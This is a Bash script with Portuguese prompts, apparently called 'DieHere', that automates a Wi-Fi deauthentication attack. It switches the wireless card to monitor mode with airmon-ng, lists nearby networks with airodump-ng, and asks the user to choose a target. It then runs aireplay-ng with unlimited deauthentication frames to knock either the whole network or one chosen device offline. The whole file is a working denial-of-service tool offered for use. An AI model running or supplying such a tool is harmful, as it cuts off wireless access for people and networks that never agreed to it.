#!/bin/bash
clear
echo '		 ____  _      _   _               
		|  _ \(_) ___| | | | ___ _ __ ___ 
		| | | | |/ _ \ |_| |/ _ \ `__/ _ \
		| |_| | |  __/  _  |  __/ | |  __/
		|____/|_|\___|_| |_|\___|_|  \___|
'

echo '[ATENÇÃO] Porfavor, aumente a largura de seu terminal!         ->  ->  ->'
echo '[ATENÇÃO] Este processo é MUITO importante!!!'
echo "[ATENÇÃO] Já aumentou?... <ENTER> para continuar..." ; read 
clear
echo ' '
echo "[+]Processando..."
echo ' '

#Identificando a placa de rede wireless
PLACA=`ifconfig | grep w | cut -d ":" -f1`

#Alterando a placa de rede wireless para o modo monitor
airmon-ng start $PLACA > /dev/null

PLACA2=`ifconfig | grep w | cut -d ":" -f1`
sleep 3

#Código do diabo que demorei demais para conseguir chegar nele
./Secundario.sh & airodump-ng $PLACA2 > mom.txt 2>&1 | pgrep -f airodump-ng > matar.txt

#Apresentação das redes wi-fi disponiveis
cat mom.txt | cut -c74-100000

echo '[ATENÇÃO] Copie e cole para evitar erros!'
echo '-----------------------------------'
read -p '[+] Digite o Nome da rede wifi alvo: ' NOME

REDEALVO=`cat mom.txt | grep $NOME | cut -d " " -f2 | sed -n '1p'`

	clear
	echo '[ATENÇÃO] Porfavor selecione uma opção'
	echo ' ' 
	echo '[1] Derrubar a rede inteira'
	echo '[2] Derrubar um alvo especifico'		
	read -n1 -s OPCAO
	echo ' '

	if [ $OPCAO -eq 1 ];then
		echo ' '
		rm mom.txt

aireplay-ng --deauth 0 -D -a $REDEALVO $PLACA2 > /dev/null | ./Contador.sh
	
	else
		CH=`cat mom.txt | grep $NOME | cut -c49,50 | sed -n '1p'`
		rm mom.txt

./Terciario.sh & airodump-ng --bssid $REDEALVO -c $CH $PLACA2 > mom2.txt 2>&1 | pgrep -f airodump-ng > matar2.txt

		echo '[ATENÇÃO] Copie e cole para evitar erros!'
		echo '-----------------------------------------'
		echo '[+] Digite o BSSID da estação alvo: ' ; read ESTALVO
		echo ' '
		
aireplay-ng --deauth 0 -a $REDEALVO -c $ESTALVO $PLACA2 > /dev/null | ./Contador.sh	
	
	fi
